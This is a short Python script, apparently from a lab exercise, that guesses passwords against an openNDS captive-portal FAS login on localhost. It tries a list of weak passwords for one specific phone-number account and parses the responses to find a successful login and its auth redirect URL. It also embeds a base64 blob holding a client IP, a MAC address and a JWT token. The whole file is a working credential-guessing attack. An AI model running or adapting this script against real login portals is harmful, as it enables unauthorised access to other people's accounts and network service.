#!/usr/bin/env python3
"""Reproduce FAS login and inspect redirect target."""
from __future__ import annotations

import base64
import re
import urllib.parse
import urllib.request

FAS = (
    "aGlkPTE5ODM5YTM4MTJiN2ZjMzE5N2M1OTA3ZDVmMWU2OGJiZjYzNjdmYjhkOGEyNmE1NWZiOWE1ODEyYTc3MGE3MzAs"
    "IGNsaWVudGlwPTE5Mi4xNjguMTAwLjEzMiwgY2xpZW50bWFjPWVlOjEzOjhjOmQxOjYyOjk4LCBjbGllbnRfdHlwZT1j"
    "cGRfY2FuLCBjcGlfcXVlcnk9LCBnYXRld2F5bmFtZT1OZXdXaUZJJTIwTm9kZSUzYTIwNzY5MzQ0NjJmZSUyMCwgZ2F0"
    "ZXdheXVybD1odHRwJTNhJTJmJTJmaG9tZS5tZSwgdmVyc2lvbj0xMC4zLjEsIGdhdGV3YXlhZGRyZXNzPTE5Mi4xNjgu"
    "MTAwLjE6MjA1MCwgZ2F0ZXdheW1hYz0yMDc2OTM0NDYyZmUsIG9yaWdpbnVybD1odHRwJTNhJTJmJTJmMTkyLjE2OC4x"
    "LjEyNSUzYTgwODAlMmZwb3J0YWwlMmYlM2Z0b2tlbiUzZGV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNK"
    "OS5leUpwWkNJNk5Td2ljbTlzWlNJNkluVnpaWElpTENKbGVIQWlPakUzT0RnNE56a3pOakVzSW1saGRDSTZNVGM0T0Rj"
    "NU1qazJNWDAubjNnWjY1YmtkNmltci1uTHhxOXVQVkRsUWlVWXVDRWFYMzl4RURTeTY1dywgY2xpZW50aWY9cGh5MC1h"
    "cDAsIHRoZW1lc3BlYz0sIChudWxsKShudWxsKShudWxsKShudWxsKQ=="
)

# Try common lab passwords for this phone account
CANDIDATES = [
    ("13158606008", "123456"),
    ("13158606008", "1234567890"),
    ("13158606008", "admin123"),
    ("13158606008", "password"),
]


def post(user: str, password: str) -> str:
    body = urllib.parse.urlencode(
        {
            "username": user,
            "password": password,
            "action": "login",
            "fas": FAS,
        }
    ).encode()
    req = urllib.request.Request(
        f"http://127.0.0.1:8080/fas?fas={FAS}",
        data=body,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.read().decode("utf-8", "replace")


def classify(html: str) -> str:
    if "用户名或密码错误" in html:
        return "BAD_CREDS"
    if "账户已被禁用" in html:
        return "DISABLED"
    if "opennds_auth" in html or "已开通" in html or "正在进入" in html:
        m = re.search(r'url=([^"\']+)|href="([^"]+)"|meta[^>]+url=([^"\'>\s]+)', html)
        urls = re.findall(r'https?://[^"\'\s<>]+', html)
        auth = [u for u in urls if "opennds_auth" in u or "portal" in u]
        return "SUCCESS " + (auth[0] if auth else urls[:2].__repr__())
    if "流量" in html and "充值" in html:
        return "QUOTA"
    if "登录上网" in html:
        err = re.search(r'class="[^"]*err[^"]*"[^>]*>([^<]+)', html)
        return "FORM_AGAIN " + (err.group(1) if err else "no-err-class")
    return "OTHER " + html[:200].replace("\n", " ")


def main() -> None:
    raw = base64.b64decode(FAS).decode()
    print("fas_raw:", raw[:180], "...")
    for u, p in CANDIDATES:
        try:
            html = post(u, p)
            print(f"{u}/{p}: {classify(html)} len={len(html)}")
        except Exception as e:
            print(f"{u}/{p}: ERR {e}")


if __name__ == "__main__":
    main()
